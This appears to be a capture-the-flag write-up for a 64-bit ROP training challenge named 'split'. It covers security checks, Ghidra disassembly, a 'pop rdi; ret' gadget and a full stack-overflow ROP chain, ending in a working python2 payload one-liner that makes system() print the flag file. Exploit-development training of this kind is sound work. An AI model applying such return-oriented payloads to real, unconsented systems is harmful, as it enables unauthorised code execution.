### split
The problem guides has told you that same as ret2win, there is a 0x20 buffer, which can be overflowed, and there is still a syscall in a function named usefulFunction.

First, check the binarat security.
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
NX is enabled. Therefore, we cannot execute shellcode in stack directly. Thankful, the hint has told us that there is a syscall in function. We only need to control return address to jump to the syscall place.
Use ghidra to track the code.

There is indeed a 0x20 buffer, and indeed a syscall in function usefulFunction.

However, the syscall command is not "/bin/cat flag.txt", "but /bin/ls".
```
...
00400746 bf 4a 08        MOV        EDI=>s_/bin/ls_0040084a,s_/bin/ls_0040084a       = "/bin/ls"
         40 00
0040074b e8 10 fe        CALL       system                                           int system(char * __command)
         ff ff
...
```
Therefore, need to modify the command in the syscall, try to assign "/bin/cat flag.txt" to the register edi(x86 64 first argument)(edi 32bit, rdi 64bit).

Use ghidra to find "/bin/cat flag.txt" in binary.
```
...
                     usefulString                                    XREF[1]:     Entry Point(*)  
00601060 2f 62 69        ds         "/bin/cat flag.txt"
         6e 2f 63 
         61 74 20 

...
```
We find the string "/bin/cat flag.txt" in address 0x00601060.

Now, we need to find a instruction such as "pop rdi" or "pop edi" with ret to assign this address to edi register.

Use rop command in peda-gdb.
```
...
0x00000000004007c3 : pop rdi ; ret
...
```
We find a gadget which exactly we want.

Then, we can construct our rop overflow strings.

Same as ret2win, buffer size is 0x20, and a rbp address, so the strings should be:

```
strings = 'A'*32(32 bytes) + rbp(8 bytes) = 'A' * 40 //overflow 0x20 buffer and rbp register
```
Next, the process should return to the gadget we found before, which will be:
```
'\xc3\x07\x40\x00\x00\x00\x00\x00' //return address jump to the gadget we want. In this case is, pop rdi; ret;
```
Then, we need to push the "/bin/cat flag.txt" address into stack, which will be pop into edi register later:
```
'\x60\x10\x60\x00\x00\x00\x00\x00' //the value we want to pop into edi register. In this case is the address of string "/bin/cat flag.txt".
```
Now, we successfully assign the command we want into the edu register, we can return to the syscall place to executer syscall.
```
'\x4b\x07\x40\x00\x00\x00\x00\x00' //return address jump to the syscall. It will execute the command we assign to rdi.
```
Remember, we should directly jump to call system instruction. If we jump to the instruction right before it, the argument in edi will be modified to "/bin/ls" again. 

The overflow string will be:
```
'A'*40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x4b\x07\x40\x00\x00\x00\x00\x00'
```
Run the program with input:
```
python2 -c "print 'A'*40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x4b\x07\x40\x00\x00\x00\x00\x00'" | ./split
```
Get the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
